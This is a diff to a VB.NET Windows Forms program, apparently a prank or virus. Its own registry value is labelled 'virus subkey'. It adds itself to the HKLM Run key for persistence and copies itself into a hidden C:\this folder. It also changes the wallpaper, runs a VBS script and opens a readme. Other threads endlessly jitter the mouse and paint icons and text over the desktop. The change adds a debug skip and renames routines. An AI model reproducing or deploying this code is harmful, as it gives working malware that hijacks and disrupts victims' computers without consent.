@@ -19,7 +19,7 @@ Public Class Form2
     Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
     Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
-
+    Const IsDebug As Boolean = True
     Private a As Long
     Enum SoundW
         Do0 = 264
@@ -33,12 +33,13 @@ Public Class Form2
         T4 = 1000
     End Enum
     Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        If IsDebug Then GoTo debugTag
         a = 0
         Dim ws, fso
         ws = CreateObject("wscript.shell") '定义对象
         fso = CreateObject("scripting.filesystemobject") '定义对象
         ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
-        If Not fso.FolderExists("C:\this") Then '如果C盘下的this文件夹没有则创建
+        If (Not fso.FolderExists("C:\this")) Then '如果C盘下的this文件夹没有则创建
             fso.createfolder("C:\this") '创建文件夹
             fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
             ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹
@@ -100,6 +101,7 @@ Public Class Form2
         End If
         ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
         ws.run("C:\this\a.vbs") '运行vbs
+debugTag:
         Dim newthread0 As New Threading.Thread(AddressOf General)
         newthread0.Start()
         Timer2.Start()
@@ -110,14 +112,14 @@ Public Class Form2
         Shell("notepad.exe C:\this\readme.txt", AppWinStyle.NormalFocus)
         Dim form2 As New Form2
         'form2.Hide()
-        Dim newthread As New Threading.Thread(AddressOf Drowerror)
+        Dim newthread As New Threading.Thread(AddressOf ShakeMouse)
         newthread.Start()
-        Dim newthread2 As New Threading.Thread(AddressOf Shakemouse)
+        Dim newthread2 As New Threading.Thread(AddressOf DrawError)
         newthread2.Start()
         Dim newthread4 As New Threading.Thread(AddressOf Icoc)
         newthread4.Start()
         Threading.Thread.Sleep(1000 * 60)
-        Dim newthread5 As New Threading.Thread(AddressOf Fontcrazy)
+        Dim newthread5 As New Threading.Thread(AddressOf CrazyString)
         newthread5.Start()
         'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
         'newthread3.Start()
@@ -137,28 +139,26 @@ Public Class Form2
         Me.Top = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2)
         Me.Left = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7)
     End Sub
-    Sub Drowerror()
+    Sub ShakeMouse()
         Threading.Thread.Sleep(10000)
-        Dim a As New Form2
-        a.Hide()
-        Dim where
+        Dim where As Point
         Do
-            where = System.Windows.Forms.Control.MousePosition '获得当前鼠标位置
+            where = MousePosition '获得当前鼠标位置
             SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
-            Threading.Thread.Sleep(50) 'stop 0.05 second
+            Threading.Thread.Sleep(50) 'stop 50 milliseconds
         Loop
     End Sub
-    Sub Shakemouse()
+    Sub DrawError()
         Threading.Thread.Sleep(10000)
 again:
-        Dim ico As Bitmap = My.Resources.Resource1.tast.ToBitmap 'add resources in exe
-        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'get desktop，还要每一个窗口
+        Dim ico As Icon = My.Resources.Resource1.tast 'Get tast icon
+        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'Get Desktop Graphics
         Do
             Try
-                screen.DrawImage(ico, Windows.Forms.Control.MousePosition)
-                Threading.Thread.Sleep(1)
+                screen.DrawIcon(ico, MousePosition.X, MousePosition.Y)
+                Threading.Thread.Sleep(10)
             Catch ex As Exception '如果超出内存则运行下面的
-                screen.Dispose() '释放内存
+                screen.Dispose() '释放对象和对象句柄
                 Threading.Thread.Sleep(10000) 'stop 10 second
                 GoTo again 'jump to again
             End Try
@@ -218,7 +218,7 @@ again:
     End Sub
 
     Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
-        Dim www As Graphics = Graphics.FromHdc(ApiClass.GetWindowDC(ApiClass.GetDesktopWindow))
+        Dim www As Graphics = Graphics.FromHdc(APIClass.GetWindowDC(APIClass.GetDesktopWindow))
         Dim scr As Screen = Screen.PrimaryScreen
         Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
         Dim ww As Graphics = Graphics.FromImage(temp1)
@@ -227,33 +227,33 @@ again:
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
     Sub Icoc()
-        Dim ico1 As Bitmap = My.Resources.Resource1.a.ToBitmap
-        Dim ico2 As Bitmap = My.Resources.Resource1.b.ToBitmap
-        Dim ico3 As Bitmap = My.Resources.Resource1.c.ToBitmap
-        Dim ico4 As Bitmap = My.Resources.Resource1.d.ToBitmap
-        Dim ico5 As Bitmap = My.Resources.Resource1.e.ToBitmap
-        Dim ico6 As Bitmap = My.Resources.Resource1.f.ToBitmap
-        Dim ico7 As Bitmap = My.Resources.Resource1.g.ToBitmap
+        Dim ico1 As Icon = My.Resources.Resource1.a
+        Dim ico2 As Icon = My.Resources.Resource1.b
+        Dim ico3 As Icon = My.Resources.Resource1.c
+        Dim ico4 As Icon = My.Resources.Resource1.d
+        Dim ico5 As Icon = My.Resources.Resource1.e
+        Dim ico6 As Icon = My.Resources.Resource1.f
+        Dim ico7 As Icon = My.Resources.Resource1.g
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
         Threading.Thread.Sleep(1000 * 40)
         Do
-            screen.DrawImage(ico1, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico1, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico2, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico2, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico3, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico3, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico4, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico4, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico5, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico5, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico6, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico6, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico7, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+            screen.DrawIcon(ico7, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
         Loop
     End Sub
-    Sub Fontcrazy()
+    Sub CrazyString()
         Threading.Thread.Sleep(1000 * 20)
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
         Do
